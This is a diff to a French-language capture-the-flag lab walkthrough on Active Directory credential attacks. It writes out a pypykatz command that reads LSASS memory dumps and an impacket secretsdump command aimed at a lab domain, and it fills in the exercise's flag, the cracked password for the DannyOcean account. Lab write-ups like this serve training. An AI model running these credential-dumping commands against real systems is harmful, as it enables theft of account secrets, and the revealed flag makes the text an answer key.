@@ -342,9 +342,10 @@ La commande pour extraire le contenu du LSASS (.dmp) et l'afficher dans un forma
     pypykatz lsa minidump "your_lsass_file.dmp" --json
 ```
 
-Forcer le hash et trouver le MDP
+Le compte a trouver est DannyOcean et il faut brutforce le password
+Le flag est le apssword
 
-FLAG ( :
+FLAG (Qwerty123) :
 
 
 
@@ -369,7 +370,7 @@ Grâce à l’étape précédente, vous possédez le hash NTLM ou le mot de pass
 
 pour réaliser l'attaque depuis Exegol : 
 ```shell 
-    secretsdump -outputfile 'something' 'rome.local'/'toto':'toto2022'@'10.10.10.168'
+    secretsdump -outputfile 'something' 'mgmgrand.local'/'DannyOcean':'Qwerty123'@'10.1.1.1'
 ```
 
 ```shell 
